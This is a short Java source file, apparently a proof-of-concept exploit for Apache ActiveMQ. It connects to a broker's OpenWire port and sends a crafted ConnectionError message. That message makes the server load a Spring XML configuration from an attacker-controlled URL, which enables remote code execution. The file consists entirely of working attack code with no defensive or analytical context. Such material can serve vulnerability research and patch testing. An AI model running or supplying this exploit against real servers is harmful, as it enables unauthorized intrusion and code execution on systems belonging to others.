import org.apache.activemq.ActiveMQConnection;
import org.apache.activemq.ActiveMQConnectionFactory;
import org.apache.activemq.command.ConnectionError;
import org.springframework.context.support.ClassPathXmlApplicationContext;

import javax.jms.ConnectionFactory;

/**
 * @Projectname: demo
 * @Filename: ConnectionErrorPoc
 * @Author: T0ngMystic
 * @Data:2023/12/25 16:22
 * @Description: unauthorized
 */
public class ConnectionErrorPoc {
    public static void main(String[] args) throws Exception {
        String targetip = "127.0.0.1";
        String targetport = "61616";
        String xmlWeb = "http://127.0.0.1:8000/poc.xml";
        String target = "tcp://"+targetip+":"+targetport;
        ConnectionFactory connectionFactory = new ActiveMQConnectionFactory(target);
        ActiveMQConnection connection = (ActiveMQConnection)connectionFactory.createConnection();
        connection.start();
        ConnectionError message = new ConnectionError();
        message.setException(new ClassPathXmlApplicationContext(xmlWeb));
        connection.getTransportChannel().oneway(message);
        connection.close();
    }
}
